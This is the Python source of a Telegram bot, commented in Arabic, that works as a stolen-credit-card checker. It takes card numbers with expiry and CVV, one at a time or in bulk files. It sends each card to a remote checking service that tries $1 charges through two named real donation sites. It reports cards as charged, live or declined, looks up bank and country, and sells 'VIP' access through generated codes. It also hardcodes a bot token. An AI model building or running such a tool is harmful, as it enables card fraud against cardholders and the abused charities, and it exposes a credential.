import os
import re
import time
import random
import string
import asyncio
import httpx
from telegram import Update
from telegram.ext import (
    Application, CommandHandler, MessageHandler, filters, ContextTypes
)

TOKEN = '8697100491:AAHFj14hZFIneFm2nWRNkpOrX6vshZsFu4o'

# ------------------- Users -------------------

ADMINS = [6843321125]  # ضع هنا ID الأدمن
VIP_USERS = {}       # {user_id: expiration_timestamp}
BANNED_USERS = {}    # {user_id: True}
ALL_USERS = set()    # كل مستخدم دخل البوت
stop_users = {}
last_check_time = {}
ANTI_SPAM_SECONDS = 7

# 🔥 أضف فوق خالص بعد المتغيرات
user_tasks = {}

# ------------------- Gates -------------------

GATES = [
    "https://rightchange.org/?give_forms=zakat",
    "https://raybensch.com/donations/support-ray/"
]
gate_index = 0
api_semaphore = asyncio.Semaphore(6)

# ------------------- Codes -------------------

CODES = {}  # {"WAFA-XXXX-XXXX-XXXX": {"duration":7, "max_users":5, "used":0, "created":timestamp}}

# ------------------- BIN Lookup -------------------

async def get_bin_info(bin_number):
    urls = [
        f"https://lookup.binlist.net/{bin_number}",
        f"https://bins.antipublic.cc/bins/{bin_number}",
        f"https://bincheck.io/api/{bin_number}"
    ]
    for attempt in range(3):
        for url in urls:
            try:
                async with httpx.AsyncClient(timeout=10) as client:
                    r = await client.get(url)
                    if r.status_code != 200:
                        continue
                    data = r.json()
                    brand = data.get("scheme") or data.get("brand") or data.get("type")
                    card_type = data.get("type") or data.get("card_type")
                    bank = (
                        data.get("bank", {}).get("name")
                        if isinstance(data.get("bank"), dict)
                        else data.get("bank")
                    )
                    country = (
                        data.get("country", {}).get("name")
                        if isinstance(data.get("country"), dict)
                        else data.get("country")
                    )
                    if not bank:
                        bank = data.get("issuer") or data.get("bank_name")
                    if not country:
                        country = data.get("country_name")
                    if brand or bank or country:
                        return (
                            f"{brand or 'Unknown'} - {card_type or 'Unknown'}",
                            bank or "Unknown",
                            country or "Unknown"
                        )
            except:
                continue
        await asyncio.sleep(0.5)
    return "Unknown", "Unknown", "Unknown"

# ------------------- Check API -------------------

async def check_card_api(card_full):
    global gate_index
    gate = GATES[gate_index]
    gate_index = (gate_index + 1) % len(GATES)
    params = {"url": gate, "card": card_full, "amount": 1.00}
    async with api_semaphore:
        try:
            async with httpx.AsyncClient(timeout=15) as client:
                r = await client.get("http://gatescheck.duckdns.org:7000/check", params=params)
                result_raw = r.json().get('result','')
                result = result_raw.lower()
                if "charge" in result or "success" in result:
                    return "approved", result_raw
                elif "insufficient" in result:
                    return "live", result_raw
                else:
                    return "declined", result_raw
        except:
            return "declined", "Error"

# ------------------- Format Response -------------------

async def format_response(card_full, status, response, taken):
    bin_number = card_full.split("|")[0][:6]
    info, bank, country = await get_bin_info(bin_number)
    if status == "approved":
        title = "#Charge 🔥"
    elif status == "live":
        title = "#Live ✅"
    else:
        title = "#Declined ❌"
    return f"""{title}

💳 Card: {card_full}
📨 Response: {response}

🏦 Info: {info}
🏛 Bank: {bank}
🌍 Country: {country}

⏱ Time: {taken}s
"""

# ------------------- Permissions -------------------

def can_user_check(user_id, mode="file"):
    if user_id in ADMINS:
        return True
    elif BANNED_USERS.get(user_id):
        return False
    elif user_id in VIP_USERS and VIP_USERS[user_id] > time.time():
        return True
    else:
        return mode == "single"

# ------------------- /pp -------------------

async def pp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    ALL_USERS.add(user_id)

    if not can_user_check(user_id, "single"):  
        await update.message.reply_text("❌ VIP only for single check.")  
        return  

    if user_id not in ADMINS and (user_id not in VIP_USERS or VIP_USERS[user_id] < time.time()):  
        now = time.time()  
        last = last_check_time.get(user_id, 0)  
        if now - last < ANTI_SPAM_SECONDS:  
            await update.message.reply_text(f"❌ Wait {ANTI_SPAM_SECONDS} seconds before next check")  
            return  
        last_check_time[user_id] = now  

    # 🔥 حماية التاسك
    try:
        asyncio.create_task(process_pp(update, context))
    except Exception as e:
        await update.message.reply_text(f"Error: {e}")

async def process_pp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    card_full = " ".join(context.args)
    if not card_full:
        await update.message.reply_text("Usage:\n/pp 4242424242424242|09|28|123")
        return
    start_time = time.time()
    status, response = await check_card_api(card_full)
    taken = round(time.time()-start_time,2)
    text = await format_response(card_full, status, response, taken)
    await update.message.reply_text(text)

# ------------------- /stop -------------------

async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    stop_users[user_id] = True
    await update.message.reply_text("Stopped ⛔")

# ------------------- File Handler -------------------

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    ALL_USERS.add(user_id)

    if not can_user_check(user_id, "file"):  
        await update.message.reply_text("❌ VIP only for file check.")  
        return  

    # 🔥 الأدمن يقدر يشغل كذا ملف - غيره لا
    if user_id not in ADMINS:
        if user_id in user_tasks and not user_tasks[user_id].done():
            await update.message.reply_text("❌ Wait until current file finishes")
            return  

    try:
        task = asyncio.create_task(process_file(update, context))
        user_tasks[user_id] = task
    except Exception as e:
        await update.message.reply_text(f"Error: {e}")

# ------------------- process_file -------------------

async def process_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    stop_users[user_id] = False

    try:
        os.makedirs("downloads", exist_ok=True)

        file = await update.message.document.get_file()
        file_path = f"downloads/{file.file_id}.txt"
        await file.download_to_drive(file_path)

        results_file_path = f"downloads/results_{file.file_id}.txt"

        approved = live = declined = 0

        panel_msg = await update.message.reply_text("Start Checking... 🔍")

        with open(file_path,'r',encoding='utf-8') as f:
            lines = f.readlines()

        async def process_line(line):  
            nonlocal approved, live, declined  
            try:
                match = re.findall(r'\d{12,16}\|\d{2}\|\d{2,4}\|\d{3,4}',line)  
                if not match:
                    return None  

                card_full = match[0]  

                start_time=time.time()  
                status,response = await check_card_api(card_full)  

                await asyncio.sleep(random.uniform(0,2))  

                taken = round(time.time()-start_time,2)  
                text = await format_response(card_full,status,response,taken)  

                if status=="approved":
                    approved+=1
                    await update.message.reply_text(text)  
                elif status=="live":
                    live+=1
                    await update.message.reply_text(text)  
                else:
                    declined+=1  

                last_info,last_bank,last_country = await get_bin_info(card_full.split("|")[0][:6])  

                panel = f"""📊 Status

✅ Charge: {approved} 💥
🟢 Live: {live} 💫
❌ Declined: {declined}
📂 Total: {approved+live+declined}

━━━━━━━━━━━━━━━
💳 Last Card: {card_full}
📨 Response: {response}
🏦 Info: {last_info}
🏛 Bank: {last_bank}
🌍 Country: {last_country}
📌 Status: {status}
━━━━━━━━━━━━━━━

⛔ Stop: {'ON' if stop_users.get(user_id) else 'OFF'}
"""
                try:
                    await panel_msg.edit_text(panel)
                except:
                    pass

                return text

            except Exception as e:
                print(f"Line Error: {e}")
                return None

        for line in lines:  
            if stop_users.get(user_id):
                await update.message.reply_text("Stopped ⛔")
                return  

            try:
                await process_line(line)
            except Exception as e:
                print(f"Loop Error: {e}")
                continue  

        with open(results_file_path,'w',encoding='utf-8') as result_file:  
            for line in lines:  
                try:
                    r = await format_response(line.strip(),"N/A","N/A",0)  
                    result_file.write(r+"\n\n")  
                except:
                    continue

        await update.message.reply_text(f"Done ✅\nResults saved: {results_file_path}")

    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

# ------------------- ERROR HANDLER -------------------

async def error_handler(update, context):
    print(f"Global Error: {context.error}")

# ------------------- باقي أوامر البوت -------------------

# 🔥 إضافة /try
async def try_reply(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMINS:
        return
    try:
        user_id = int(context.args[0])
        reply_text = " ".join(context.args[1:])
        await context.bot.send_message(chat_id=user_id, text=reply_text)
        await update.message.reply_text("✅ Sent")
    except:
        await update.message.reply_text("❌ Usage:\n/try 123456789 hello")

# ------------------- /code -------------------

async def code_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    ALL_USERS.add(user_id)
    if len(context.args)==0: 
        return await update.message.reply_text("Usage:\n/code YOURCODEHERE")
    code = context.args[0].upper()
    if code not in CODES:
        return await update.message.reply_text("❌ Invalid code")
    code_data = CODES[code]
    if code_data["used"] >= code_data["max_users"]:
        return await update.message.reply_text("❌ Code usage limit reached")
    VIP_USERS[user_id] = int(time.time()) + code_data["duration"] * 86400
    code_data["used"] += 1
    await update.message.reply_text(f"✅ Code activated!\nYou are now VIP for {code_data['duration']} days.\nUsed {code_data['used']}/{code_data['max_users']}")

# ------------------- /wafa -------------------

async def wafa_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMINS: 
        return await update.message.reply_text("❌ Only admin can create codes")
    if len(context.args)<2: 
        return await update.message.reply_text("Usage:\n/wafa DAYS MAX_USERS")
    try:
        duration=int(context.args[0])
        max_users=int(context.args[1])
    except:
        return await update.message.reply_text("❌ Invalid numbers")
    code = "WAFA-"+"-".join("".join(random.choices(string.ascii_uppercase+string.digits,k=4)) for _ in range(3))
    CODES[code] = {"duration":duration,"max_users":max_users,"used":0,"created":time.time()}
    await update.message.reply_text(f"✅ Created code:\n{code}\nDuration: {duration} days\nMax users: {max_users}")

# ------------------- /show_users -------------------

async def show_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMINS: 
        return await update.message.reply_text("❌ Only admin")
    msg = "📊 All Users:\n\n"
    for uid in ALL_USERS:
        status = "BANNED" if uid in BANNED_USERS else "VIP" if uid in VIP_USERS else "NORMAL"
        expire = f" expires in {int((VIP_USERS[uid]-time.time())/3600)}h" if uid in VIP_USERS else ""
        msg+=f"{uid} - {status}{expire}\n"
    await update.message.reply_text(msg if msg else "No users yet")

# ------------------- Ban/Unban -------------------

async def ban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMINS: 
        return await update.message.reply_text("❌ Only admin can ban users")
    if len(context.args)==0: 
        return await update.message.reply_text("Usage:\n/ban_user USER_ID")
    uid=int(context.args[0])
    BANNED_USERS[uid]=True
    VIP_USERS.pop(uid,None)
    await update.message.reply_text(f"User {uid} banned ✅")

async def unban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMINS: 
        return await update.message.reply_text("❌ Only admin can unban users")
    if len(context.args)==0: 
        return await update.message.reply_text("Usage:\n/unban_user USER_ID")
    uid=int(context.args[0])
    BANNED_USERS.pop(uid,None)
    await update.message.reply_text(f"User {uid} unbanned ✅")

# ------------------- /start -------------------

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    ALL_USERS.add(user_id)
    await update.message.reply_text("Bot Ready ✅")

# ------------------- Run -------------------

def main():
    app = Application.builder().token(TOKEN).build()

    app.add_error_handler(error_handler)  # 🔥 مهم جدًا

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("pp", pp))
    app.add_handler(CommandHandler("stop", stop))
    app.add_handler(CommandHandler("code", code_command))
    app.add_handler(CommandHandler("wafa", wafa_command))
    app.add_handler(CommandHandler("show_users", show_users))
    app.add_handler(CommandHandler("ban_user", ban_user))
    app.add_handler(CommandHandler("unban_user", unban_user))
    app.add_handler(CommandHandler("try", try_reply))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))

    app.run_polling()

if __name__ == "__main__":
    main()
